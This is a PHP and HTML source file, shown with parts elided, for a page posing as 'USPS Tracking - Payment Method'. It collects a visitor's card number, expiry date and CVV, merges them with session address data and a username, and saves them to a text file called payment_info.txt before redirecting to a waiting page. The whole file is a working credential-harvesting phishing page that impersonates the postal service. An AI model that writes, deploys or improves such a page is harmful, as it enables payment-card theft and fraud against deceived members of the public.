...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    if (empty($errors)) {
        ...
        $data = array_merge(
            ['step' => 'payment_info', 'usrnm' => $username],
            $_SESSION['address_verification'] ?? [],
            $_SESSION['payment_info']
        );
        
        if (saveUserData('payment_info.txt', $data)) {
            // Redirect to wait page
            header('Location: wait.php');
            exit;
        } else {
            $errors['form'] = 'There was an error processing your payment. Please try again.';
        }
    }
}
?>
...
<head>
    ...
    <title>USPS Tracking - Payment Method</title>
...
<body class="font-['HelveticaNeueW02-55Roma','Helvetica Neue',Helvetica,Arial,sans-serif] text-[#23285a]">
        ...
        <main class="flex-1 w-full">
            ...
            <div class="w-full max-w-[960px] mx-auto px-4 sm:px-6 pb-16">
                <div class="mt-12 space-y-12">
                    ...
                    <!-- Payment Form -->
                    <section>
                        <div class="text-[17px] font-semibold text-[#23285a] mb-1">Payment Method</div>
                        <div class="text-[10px] text-[#c5282c] tracking-wide mb-5">
                        ...
                        <?php endif; ?>
                        <form method="POST" action="" class="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-4 max-w-[620px]">
                            <div class="sm:col-span-2">
                                ...
                                <?php if (isset($errors['cardNumber'])): ?>
                                    <div class="error-message mt-1 text-xs text-red-600"><?php echo htmlspecialchars($errors['cardNumber']); ?></div>
                                <?php else: ?>
                                    <div class="error-message mt-1 text-xs text-red-600"></div>
                                <?php endif; ?>
                            </div>
                            ...
                            <div>
                                ...
                                <?php if (isset($errors['expiry'])): ?>
                                    <div class="error-message mt-1 text-xs text-red-600"><?php echo htmlspecialchars($errors['expiry']); ?></div>
                                <?php else: ?>
                                    <div class="error-message mt-1 text-xs text-red-600"></div>
                                <?php endif; ?>
                            </div>
                            ...
                            <div>
                                ...
                                <?php if (isset($errors['cvv'])): ?>
                                    <div class="error-message mt-1 text-xs text-red-600"><?php echo htmlspecialchars($errors['cvv']); ?></div>
                                <?php else: ?>
                                    <div class="error-message mt-1 text-xs text-red-600"></div>
                                <?php endif; ?>
                            </div>
                            <button type="submit" class="sm:col-span-2 mt-2 inline-flex items-center justify-center bg-[#2b2a72] text-white font-semibold px-12 py-3.5 text-[16px] tracking-wide rounded-sm hover:bg-[#211f5a] transition-colors">
                                Continue
                            </button>
                        </form>
                    </section>
    ...
    <script>
        ...
        document.querySelector('input[name="cardNumber"]').addEventListener('input', function(e) {
            ...
            const errorElement = e.target.closest('div').querySelector('.error-message');
            if (errorElement) {
                errorElement.textContent = value.length === 16 ? '' : 'Card number must be 16 digits';
            }
        });
        ...
        expiryInput.addEventListener('input', function(e) {
            ...
            const isValidMonth = value.length <= 2 || (month >= 1 && month <= 12);
            
            // Update validation message
            const errorElement = e.target.closest('div').querySelector('.error-message');
            if (errorElement) {
                if (value.length > 0 && !isValidMonth) {
                    ...
                    const inputYear = parseInt(value.substring(2, 4), 10);
        ...
        document.querySelector('input[name="cvv"]').addEventListener('input', function(e) {
            ...
            const errorElement = e.target.closest('div').querySelector('.error-message');
            if (errorElement) {
                errorElement.textContent = (value.length < 3) ? 'CVV must be 3-4 digits' : '';
            }
        });
        
        // Add error message containers if they don't exist
        document.addEventListener('DOMContentLoaded', function() {
            const addErrorContainer = (inputName) => {
            ...
            ['cardNumber', 'expiry', 'cvv'].forEach(addErrorContainer);
        });
    </script>
</body>
</html>
